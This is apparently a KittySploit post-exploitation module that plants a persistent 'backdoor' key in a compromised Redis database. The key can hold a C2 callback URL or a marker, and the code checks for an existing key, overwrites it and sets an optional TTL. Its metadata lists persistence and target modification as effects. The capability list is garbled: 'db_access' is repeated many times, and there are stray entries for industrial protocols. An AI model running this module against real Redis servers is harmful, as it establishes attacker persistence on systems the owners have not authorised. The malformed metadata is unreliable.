from kittysploit import *
from lib.protocols.redis.redis_client import RedisClient


class Module(Post, RedisClient):

	__info__ = {
		"name": "Redis Inject Backdoor Key",
		"description": "Plant a persistent marker or C2 callback key in Redis",
		"author": "KittySploit Team",
		"session_type": SessionType.REDIS,
	'agent': {
	    'risk': 'intrusive',
	    'effects': ['target_modification', 'persistence'],
	    'expected_requests': 1,
	    'reversible': True,
	    'approval_required': True,
	    'produces': ['risk_signals'],
	    'cost': 1.5,
	    'noise': 0.5,
	    'value': 1.0,
	    'requires': 	    {'min_endpoints': 0,
	     'min_params': 0,
	     'tech_hints_any': [],
	     'tech_hints_all': [],
	     'specializations_any': [],
	     'risk_signals_any': [],
	     'auth_session': False,
	     'capabilities_any': [],
	     'capabilities_all': [],
	     'confidence_min': {},
	     'confidence_min_any': {},
	     'endpoint_pattern_any': [],
	     'param_any': [],
	     'api_surface_ready': False},
	    'chain': 	    {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 's7comm', 'from_detail': ''},
	                               {'capability': 'ot_assets', 'from_detail': ''},
	                               {'capability': 'ot_assets', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''}],
	     'consumes_capabilities': ['shell'],
	     'option_bindings': {},
	     'suggested_followups': []},
	},
	}

	key = OptString("kittysploit:beacon", "Backdoor key name", False)
	value = OptString("", "Marker value (callback URL, token, flag, etc.)", True)
	ttl = OptInteger(0, "TTL in seconds (0 = persistent)", False)
	db = OptInteger(-1, "Database index (0-15, -1 = keep current)", False)
	overwrite = OptBool(True, "Allow overwriting an existing key", False)

	def run(self):
		try:
			key = str(self.key or "kittysploit:beacon").strip()
			value = str(self.value if self.value is not None else "")
			if not key:
				raise ProcedureError(FailureType.ConfigurationError, "key is required")
			if not value:
				raise ProcedureError(FailureType.ConfigurationError, "value is required")

			if self.db is not None and int(self.db) >= 0:
				self.select_db(int(self.db))

			info = self.get_session_info()
			print_info(f"Target: {info.get('host', 'localhost')}:{info.get('port', 6379)} db{info.get('db', 0)}")

			key_type = self.get_key_type(key)
			if key_type not in ("none", "string"):
				raise ProcedureError(
					FailureType.NotAccess,
					f"Key {key!r} exists with type {key_type!r}",
				)
			if key_type == "string" and not self.overwrite:
				raise ProcedureError(
					FailureType.NotAccess,
					f"Key {key!r} already exists (set overwrite=True to replace)",
				)

			ex = int(self.ttl) if self.ttl and int(self.ttl) > 0 else None
			if self.set_string(key, value, ex=ex):
				print_success(f"Backdoor key planted: {key!r}")
				if ex:
					print_info(f"  TTL: {ex}s")
				else:
					print_info("  TTL: persistent")
				return True

			raise ProcedureError(FailureType.Unknown, f"Failed to plant backdoor key {key!r}")
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(FailureType.Unknown, f"Backdoor injection failed: {exc}")
